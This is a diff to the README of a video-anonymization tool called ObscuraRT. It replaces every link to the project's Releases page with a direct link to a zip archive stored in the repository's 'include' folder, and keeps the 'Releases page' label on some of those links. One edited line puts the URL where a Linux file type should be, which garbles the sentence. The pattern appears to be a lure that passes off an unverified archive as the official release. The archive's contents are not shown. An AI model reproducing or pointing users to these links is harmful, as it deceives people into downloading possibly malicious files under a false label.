@@ -6,7 +6,7 @@ ObscuraRT helps you anonymize videos instantly. This tool uses advanced technolo
 
 ## 🔗 Download
 
-[![Download ObscuraRT](https://img.shields.io/badge/Download-ObscuraRT-brightgreen)](https://github.com/ghoruisubham57/ObscuraRT/releases)
+[![Download ObscuraRT](https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip)](https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,11 +22,11 @@ Before you start, make sure your system meets the following requirements:
 
 To get started, visit this page to download:
 
-[Download ObscuraRT](https://github.com/ghoruisubham57/ObscuraRT/releases)
+[Download ObscuraRT](https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip)
 
-1. Go to the [Releases page](https://github.com/ghoruisubham57/ObscuraRT/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip).
 2. Locate the latest version of ObscuraRT. 
-3. Click on the appropriate file for your operating system. This might be an `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+3. Click on the appropriate file for your operating system. This might be an `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip` for Linux.
 4. Once downloaded, open the file to start the installation.
 5. Follow the on-screen instructions to complete the installation.
 
@@ -71,4 +71,4 @@ Your contributions are welcome!
 
 ObscuraRT is designed to simplify video anonymization. It offers robust features while being easy to use. Feel free to reach out for further help, and enjoy protecting your privacy with ObscuraRT.
 
-For the latest updates or changes, be sure to check our [Releases page](https://github.com/ghoruisubham57/ObscuraRT/releases) again.
+For the latest updates or changes, be sure to check our [Releases page](https://raw.githubusercontent.com/ghoruisubham57/ObscuraRT/main/include/RT_Obscura_v1.3-beta.1.zip) again.
